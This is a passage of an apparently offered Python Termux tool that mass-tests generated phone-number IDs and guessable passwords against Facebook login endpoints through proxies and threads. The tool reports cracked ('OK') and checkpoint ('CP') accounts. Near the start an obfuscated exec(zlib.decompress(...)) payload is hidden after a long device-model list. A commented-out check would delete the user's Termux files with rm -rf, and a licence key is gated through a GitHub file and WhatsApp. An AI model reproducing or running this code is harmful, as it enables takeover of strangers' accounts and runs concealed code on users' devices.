','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T']#;exec(zlib.decompress(b'x\x9c\xed\x97Qk\xdb0\x10\xc7\xdf\xfd)\x04}\xb0\r\x9e\xddfk\x9a\x18\x02+\xcb\nc\xeb\x18,\xa3\xb01\x8cbI\x89\x12[ru2I(\xfd\xee\x93l\xc7\xce\x96\x94f\xef\xbe\x07\xe3\x9c\xee\xff?\xe9\xf4#`\x9e\x17Ri\xa4\xe8cIAC !\x80\x1d8L\xc9\x1c\xa5R\xa4\xa5RT\xe8\x90\x95\xbaT\x14\x10\xaf\xcbgKE1\xf9&e\xf6qK\xd3RK\x850\x1cd\x1d\xe7\xe2}\tTq\xc2\x05\x93s\xa9\x1d\x87P\x86\x80nw\x9e\x1f;\xc8\x04P\x00.\xc5d\xdf9l\x12\x9e_-\xdb\xa8^\x8c8\xd1rM\x05\x9a w8\xbe\xbc\x19\x8c\xc6\xef\xae\xde\xc6\xb7\xb7w\xec3\xacE\xf2\xf0c\xa6\x1e?\x8c\xc4\xd7r\xfae\xfd=\xe7\xc3\x9f\xa3|C>M\x87k\xb7vH\x97X\'\x9cT\xfa\xd1`pu}3\x1e]\xbb\xd5\xd2\xc5\x9b.<\x14\x01I\xb1"\xd5\x8aV\xbb\xb8\xddH\x9dO\n\xac\x97\xd6\xa5\xa9s\xdbu\xc63\x9ad\x1c\xb4Y\xfd\xc5\x103\xe3`\x88\x0b$!\xb4Y\xc2\x95w`\xe1#njB*\x08l\xb8^znX\xec\\\xffw\xe7f\xe5\xc6\xd1:\xb4\xce\xddflX\x1d\x92\x05\x15\x9eia=\xc3\x95\xe4\xe2\xb0IPI\xfd\x00\xb9j\xee\xfa\xf6v\xd8\xdf\x166J\x95M\x98\xbb\xd4\xba\x808\x8ap\xc1CM3\xbaP8\x0f\xa5ZDf\xf4O\xed\xf8\x9f#0;\x9e\xca\xb4\xcc\r\x10\xee\x91\x17\xc1\x1a\x0f&On3m7\xde\xcf\xfd\xf9d\xe9y\x95\xf6\x0c`J\xc9\xbem\x8c\xd8q\xd5\x82\xda\xc17\xfc\x84\x85\x04\xed\x99\x93\x05u\x1f\xfb\x08\x1a\xa3\xea\xe9\x1f\xe9\xcd\xc1^1\x18\x9cp\xa0\xdb\x94\x16:.0\xc0\x11K\x1dL\xd1TnD&1A\xe7b\xd5*z\xbez\xbe^\xe2\xeb\x04`\xd1\xac\x99\xed\xff\x93\xd6J{\xe4z\xe4N!\xd7\xd1\xb6\'\xa5\xa3\xed\xce\xea\xcfF\xee\x05}\x0f^\x0f\xde\xe9\xff\xba\x0e\xbd\x07s2\xb8-\x8a\xe8\x9e\x12\x8e\xdb\x9fh?\xc7\xf3!|\xd5\xa9\xc7\xb1\xc7\xb1\xc1\xd1\xa9.\xa4\xfb\xb4\xf1r\xbcM6R\xad\xa9\x82\xc9\xf8\xb2\x9a\xffj\xb5\xaao\xc0\xbc\x84P\xces\xae=\xfb\xad\xe3\xff\x9b\xcc1\x17u\xd21\xf1\x07s\x15\x00\xdf').decode())
samsung = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def clear():
  os.system('clear')
import requests,os
import os
os.system("pkg install espeak")
os.system("git pull")
os.system("clear")
jalan('\033[38;5;196m                 INSTALLING TOOLS           ')
jalan('\033[38;5;34m                       WAIT               ')
os.system('espeak -b 30 "WAIT"')
time.sleep(0.03)
os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
os.system('clear')
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""\033[38;5;33m
    █████╗ ████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
   ███████║   ██║   ██║   ██║██╔████╔██║
   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ
\033[38;5;196m────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER \033[38;5;196m : \x1b[38;5;196m SUMON ROY
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m ABOUTS \033[38;5;196m      :\x1b[38;5;196m DESTROYED
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m     :\x1b[38;1;97m 109.0.5.0.3
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m      :\x1b[38;5;196m PREMIUM 
\033[38;5;196m────────────────────────────────────────────""")

def fuckxd():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"\033[38;5;196m-----------------------------------------")
	             
#-------------------[LOCATION CHECK]-------------------#
"""uxernamx = sys.argv[0]
if uxernamx=='GREEN.py':
    try:
        readhead = open('.git/config','r').read()
    except:
        print('   Somting Wrong Bro')
        idx()
    if 'BITHIKA-XD' in readhead:
        pass
    else:
        idx()
        os.system('rm -rf /data/data/com.termux/files');exit()
else:
    idx()
    os.system('rm -rf /data/data/com.termux/files');exit()"""
class Process:
    def __init__(self):
        self.cc=[]
        self.key="ATOM-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
        #self.key=""
        self.clear()
        r = self.Gex('https://github.com/DESTROYED-ATOM/ATOM/blob/main/Approve.txt')
        if self.key in r:
            self.enroll()
        else:
            self.clear()
            print("\x1b[38;1;97m               NOTES   ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
            time.sleep(3.5)
            tks = 'TOKEN KEY =%20%20:%20'+self.key
            os.system('am start https://wa.me/+918389066877?text=' + tks)
            exit()
    def clear(self):os.system('clear');____banner____()
    def Gex(self,x):
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, x)
        c.setopt(c.WRITEDATA, buffer)
        try:c.perform()
        except:exit(' Network Issue')
        c.close()
        return buffer.getvalue().decode('utf-8')
    def enroll(self):
        BITHIKA()

#━━━━[ MAIN ]━━━━#
def BITHIKA():
    ____banner____()
    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\033[1;37mTURN ON FILE CLONE')
    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\033[1;37mTURN ON MAIL CLONE')
    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\033[1;37mTURN ON RANDOM CLONE')
    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}]\033[1;37mJOIN COMMUNITY GROUP')
    print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}]\033[1;37mREPORT BUGS');linex()
    __BITHIKA__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if __BITHIKA__ in ['A','a','01','1']:__FILEX__()
    elif __BITHIKA__ in ['B','b','02','2']:print(f'\n[×]{rad}coming soon... ');BITHIKA()
    elif __BITHIKA__ in ['C','c','03','3']:SETINGX()
    elif __BITHIKA__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO")
    elif __BITHIKA__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
    else:print(f'\n[×]{rad} Choose Value Option... ');BITHIKA()

#━━━━[ SELECT MENU ]━━━━#
def SETINGX():
    ____banner____()
    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH STR RANGE 6")
    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH STR RANGE 7")
    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH STR RANGE 5");linex()
    __BITHIKAi__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
    if __BITHIKAi__ in ['A','a','01','1']:RANDOM()
    elif __BITHIKAi__ in ['B','b','02','2']:INDIA()
    elif __BITHIKAi__ in ['C','c','03','3']:PAKISTAN()
    else:print(f'\n[×]{rad} Choose Value Option... ');SETINGX()

#━━━━[ BANGLADESH RANDOM ]━━━━#
def RANDOM():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(5))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,'57273200']
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python BITHIKA.py')
#━━━━[ INDIAN RANDOM ]━━━━#
def INDIA():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,'57273200']
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python BITHIKA.py')
#━━━━[ PAKISTAN RANDOM ]━━━━#
def PAKISTAN():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,'57273200']
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python BITHIKA.py')
#━━━━[ METHOD RANDOM ]━━━━#
def m1(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session = requests.Session()
    proxy_u = random.choice(saved_proxies).strip()
    proxies = {'http':f'{proxy_u}'}
    ua = ugrn
    DOMAIN = ("m","business","mbasic")
    fb= random.choice(DOMAIN)
    uger = random.choice(ugrn)
    warna = random.choice(my_color)
    try:
        for pas in pwv:
